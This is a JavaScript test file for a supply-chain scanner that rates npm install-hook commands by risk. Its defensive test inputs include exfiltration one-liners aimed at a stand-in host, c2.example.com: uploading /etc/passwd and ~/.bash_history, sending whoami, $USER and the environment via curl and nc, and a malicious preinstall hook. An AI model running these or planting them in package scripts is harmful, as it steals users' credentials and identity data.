// 0.1.8 in the npm engine: an install hook's command read as a program
// (the native engine's hook_command_risk, lib/native.js; the scan's
// SC-INSTALL-HOOK in lib/supplychain.js). python/tests/scanner/
// test_hook_commands.py has the full cases, and tests/architecture/
// test_rust_parity_hook_commands.py holds the native engine's reading (its
// shell parse included) to the Python engine's. Inert text: reserved names
// and private addresses, nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { hookCommandRisk } from "../src/lib/native.js";
import { scanManifest } from "../src/lib/supplychain.js";

const UPLOAD = "uploads a local file over the network";
const IDENTITY = "sends the machine's user or host name over the network";
const ENVIRONMENT = "sends environment variables over the network";
const BEACON = "tells a server it was installed (a request whose answer it throws away)";

test("local data sent: files, what local commands print, variables", () => {
  assert.ok(hookCommandRisk("curl -X POST --data @/etc/passwd https://c2.example.com/a").includes(`${UPLOAD} (/etc/passwd)`));
  assert.ok(hookCommandRisk("cat ~/.bash_history | base64 | curl -d @- https://c2.example.com").includes(`${UPLOAD} (~/.bash_history)`));
  assert.ok(hookCommandRisk('curl https://c2.example.com/ -H "user:$(whoami)"').includes(IDENTITY));
  assert.ok(hookCommandRisk("echo $USER | nc c2.example.com 80").includes(IDENTITY));
  assert.ok(hookCommandRisk("env | curl -X POST --data-binary @- https://c2.example.com")
    .includes(`${ENVIRONMENT} (the whole environment)`));
  assert.ok(hookCommandRisk("bash -lc 'wget -qO- https://c2.example.com/?u=$USER'").includes(IDENTITY));
  assert.deepEqual(hookCommandRisk("ls -al /opt | base64 | xargs -I {} curl http://c2.example.com:8000/?data={}"),
    ["sends what local commands report about the machine over the network (ls)"]);
});

test("what a download may name, and beacons", () => {
  for (const cmd of ["curl -fsSL https://github.com/x/y/releases/download/v1/y-$(uname -s)-$(uname -m) -o bin/y",
    'curl -H "Authorization: token $GITHUB_TOKEN" -L https://api.github.com/repos/x/y/releases/assets/1 -o y.tgz',
    "curl -sL https://c2.example.com/x.tgz | tar xz", "curl -sf https://registry.npmjs.org > /dev/null && node dl.js || node b.js",
    "curl http://localhost:3000/ready", "node install.js"]) {
    assert.deepEqual(hookCommandRisk(cmd), [], cmd);
  }
  for (const cmd of ["wget -q -O/dev/null https://c2.example.com/b", "curl -s https://c2.example.com/ping || true",
    "ping -c 1 c2.example.com", "wget --spider https://c2.example.com"]) {
    assert.deepEqual(hookCommandRisk(cmd), [BEACON], cmd);
  }
  assert.deepEqual(hookCommandRisk("curl -s https://c2.example.com/flags", true), []);
});

test("an option given no value sends nothing", () => {
  // the command reads as it would without it (0.1.8's first reading indexed past the words)
  for (const cmd of ["curl https://c2.example.com -d", "curl https://c2.example.com -H",
    "wget https://c2.example.com --post-data", "curl https://c2.example.com --data", "curl -d"]) {
    assert.deepEqual(hookCommandRisk(cmd), hookCommandRisk(cmd.slice(0, cmd.lastIndexOf(" "))), cmd);
  }
});

test("SC-INSTALL-HOOK: CRITICAL on what the command does, the tools only a hint", () => {
  const scripts = (s, path = "node_modules/p/package.json") =>
    scanManifest(path, JSON.stringify({ name: "p", version: "1.0.0", scripts: s }, null, 2)).map((i) => [i.sev, i.msg]);
  assert.deepEqual(scripts({ preinstall: "curl -s https://c2.example.com/?u=$(whoami)" }),
    [["CRITICAL", `"preinstall" script ${IDENTITY}.`]]);
  assert.deepEqual(scripts({ postinstall: "curl -sSL https://c2.example.com/x.tgz -o x.tgz" }),
    [["MAJOR", `"postinstall" script runs a download or evaluation command at install time: 'curl -sSL https://c2.example.com/x.tgz -o x.tgz'.`]]);
  assert.deepEqual(scripts({ prepare: "husky install" }, "package.json").map(([sev]) => sev), ["INFO"]);
});
